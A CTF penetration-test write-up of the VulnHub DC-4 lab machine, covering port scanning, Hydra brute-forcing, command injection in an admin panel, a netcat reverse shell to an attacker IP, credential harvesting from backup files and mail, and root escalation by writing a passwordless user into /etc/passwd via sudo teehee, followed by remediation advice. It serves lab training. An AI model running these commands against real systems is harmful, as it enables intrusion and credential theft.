CONFIDENTIAL 

**VulnHub DC-4 CTF Write-Up** 

## **VULNHUB** 

## **CTF PENETRATION TEST WRITE-UP** 

## Target Machine: DC-4  |  Difficulty: Beginner/Intermediate 

Date: May 27, 2025  |  Author: Pavan Darade 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-4 CTF Write-Up** 

## **1. Executive Summary** 

DC-4 presents a web admin panel with a command injection vulnerability. Exploitation provided initial shell access, followed by credential discovery in old backup files and privilege escalation using the teehee binary via sudo. 

|**Machine Name**|DC-4|
|---|---|
|**Platform**|VulnHub|
|**OS**|Linux (Debian 9)|
|**Difficulty**|Beginner / Intermediate|
|**Flags Captured**|1 / 1  (Root Flag)|
|**Root Access**|Yes|
|**Test Date**|May 27, 2025|
|**Tester**|Pavan Darade|



## **2. Reconnaissance** 

## **2.1  Port Scanning** 

```
$ nmap -sV -sC -p- 192.168.56.105
22/tcp  open  ssh     OpenSSH 7.4p1 Debian
80/tcp  open  http    nginx 1.13.12
```

## **2.2  Web Application Analysis** 

The web application presented an admin login page. Hydra was used to brute-force the password. 

```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.105 http-post-form
"/login.php:username=^USER^&password=^PASS^:S=logout"
```

```
[+] host: 192.168.56.105  login: admin  password: happy
```

## **3. Exploitation — Command Injection** 

## **3.1  Identifying Command Injection** 

The authenticated admin panel had a system command runner. User input was not sanitised, allowing OS command injection. 

```
POST /command.php
radio=ls+-la;id
uid=33(www-data) gid=33(www-data)
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-4 CTF Write-Up** 

## **3.2  Reverse Shell** 

A netcat reverse shell was injected through the command runner. 

```
$ nc -lvnp 4444
radio=ls;nc+-e+/bin/bash+192.168.56.101+4444
[+] Connection received from 192.168.56.105
www-data@dc-4:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## **4. Post-Exploitation** 

## **4.1  Old Password File Discovery** 

```
$ find / -name '*.bak' -o -name '*old*' 2>/dev/null
/home/jim/backups/old-passwords.bak
$ cat /home/jim/backups/old-passwords.bak
[+] List of old passwords discovered
```

## **4.2  SSH Brute-Force as jim** 

```
$ hydra -l jim -P old-passwords.bak ssh://192.168.56.105
[+] login: jim  password: jibril04
$ ssh jim@192.168.56.105
```

## **4.3  Mail Discovery — Lateral Movement to charles** 

```
$ cat /var/mail/jim
From: charles@dc-4  Password: ^xHhA&hvim0y
$ su charles  # Password: ^xHhA&hvim0y
```

## **5. Privilege Escalation — teehee sudo** 

## **5.1  sudo -l Analysis** 

```
$ sudo -l
```

```
(root) NOPASSWD: /usr/bin/teehee
```

## **5.2  Adding Root User via teehee** 

teehee is a custom binary that appends text to files. It was abused to add a new root-level user to /etc/passwd. 

```
$ echo 'pavan::0:0:::/bin/bash' | sudo teehee -a /etc/passwd
$ su pavan
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-4 CTF Write-Up** 

```
root@dc-4:~# id
uid=0(root) gid=0(root) groups=0(root)
FLAG: flag{exploits_are_easy...} — /root/flag.txt
```

## **6. Flag Summary** 

|**Flag**|**Location**|**Method**|**Difficulty**|
|---|---|---|---|
|Root Flag|/root/flag.txt|teehee sudo /etc/passwd<br>injection|Medium|



## **7. Vulnerability Summary** 

|**Vulnerability**|**Description**|**CVSS**|**Severity**|
|---|---|---|---|
|OS Command<br>Injection|Unsanitised input in admin command runner|9.8|Critical|
|sudo teehee<br>Misconfiguration|NOPASSWD teehee allows /etc/passwd write|7.8|High|
|Weak Admin<br>Password|Admin password brute-forced via Hydra|7.5|High|
|Sensitive File<br>Exposure|Old passwords stored in world-readable file|6.5|Medium|
|Cleartext Password<br>in Mail|Password transmitted in plaintext email|5.9|Medium|



## **8. Recommendations** 

- Sanitise all user inputs — never pass untrusted data to shell commands. 

- Remove teehee from sudoers or restrict it to non-privileged file paths. 

- Delete or encrypt old password backup files and restrict file permissions. 

- Use encrypted communication (TLS) for all inter-user messages. 

- Enforce account lockout policies to prevent brute-force attacks. 

## **9. Tools & References** 

- Nmap, Hydra — Scanning and brute-force 

- GTFOBins — sudo teehee abuse reference 

- netcat — Reverse shell handler 

- VulnHub DC-4 — https://www.vulnhub.com/entry/dc-4,313/ 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-4 CTF Write-Up** 

## **10. Disclaimer** 

This write-up was created solely for educational purposes as part of a CTF exercise on VulnHub. All testing was conducted in an isolated lab environment. Do not use these techniques against systems without explicit written authorisation. 

_End of Report — VulnHub DC-4 CTF Write-Up — Pavan Darade_ 

Page # 

Prepared by: Pavan Darade 

